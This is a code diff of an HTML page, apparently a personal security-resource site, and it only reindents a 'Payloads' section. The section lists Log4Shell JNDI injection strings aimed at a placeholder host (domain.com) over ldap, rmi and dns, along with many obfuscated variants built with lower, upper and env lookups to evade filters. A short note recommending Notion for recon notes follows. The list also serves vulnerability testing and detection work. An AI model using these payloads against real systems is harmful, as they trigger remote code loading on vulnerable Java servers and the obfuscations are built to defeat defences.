@@ -195,34 +195,34 @@
                   (adsbygoogle = window.adsbygoogle || []).push({});
                    </script>
                     </div>
-                   <h2>Payloads</h2>
-                 <pre><code>
-                            ${env:JAVA_VERSION}
-                            ${sys:java.version}
-                            ${hostName}
-                            ${sys:java.vendor}
-                            ${jndi:ldap://domain.com/j}
-                            ${jndi:ldap:/domain.com/a}
-                            ${jndi:dns:/domain.com}
-                            ${jndi:dns://domain.com/j}
-                            ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://domain.com/j}
-                            ${${::-j}ndi:rmi://domain.com/j}
-                            ${jndi:rmi://domainldap.com/j}
-                            ${${lower:jndi}:${lower:rmi}://domain.com/j}
-                            ${${lower:${lower:jndi}}:${lower:rmi}://domain.com/j}
-                            ${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://domain.com/j}
-                            ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://domain.com/j}
-                            ${jndi:${lower:l}${lower:d}a${lower:p}://domain.com}
-                            ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//domain.com/a}
-                            jn${env::-}di:
-                            jn${date:}di${date:':'}
-                            j${k8s:k5:-ND}i${sd:k5:-:}
-                            j${main:\k5:-Nd}i${spring:k5:-:}
-                            j${sys:k5:-nD}${lower:i${web:k5:-:}}
-                            j${::-nD}i${::-:}
-                            j${EnV:K5:-nD}i:
-                            j${loWer:Nd}i${uPper::}
-                    </code></pre>
+<h2>Payloads</h2>
+<pre><code>
+${env:JAVA_VERSION}
+${sys:java.version}
+${hostName}
+${sys:java.vendor}
+${jndi:ldap://domain.com/j}
+${jndi:ldap:/domain.com/a}
+${jndi:dns:/domain.com}
+${jndi:dns://domain.com/j}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://domain.com/j}
+${${::-j}ndi:rmi://domain.com/j}
+${jndi:rmi://domainldap.com/j}
+${${lower:jndi}:${lower:rmi}://domain.com/j}
+${${lower:${lower:jndi}}:${lower:rmi}://domain.com/j}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://domain.com/j}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://domain.com/j}
+${jndi:${lower:l}${lower:d}a${lower:p}://domain.com}
+${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//domain.com/a}
+jn${env::-}di:
+jn${date:}di${date:':'}
+j${k8s:k5:-ND}i${sd:k5:-:}
+j${main:\k5:-Nd}i${spring:k5:-:}
+j${sys:k5:-nD}${lower:i${web:k5:-:}}
+j${::-nD}i${::-:}
+j${EnV:K5:-nD}i:
+j${loWer:Nd}i${uPper::}
+</code></pre>
                     <h2>Notion</h2>
                     <p>Notion is best for taking notes as it is easier to use. I am personally using this with my automated recon tools.</p>
                     Features:-
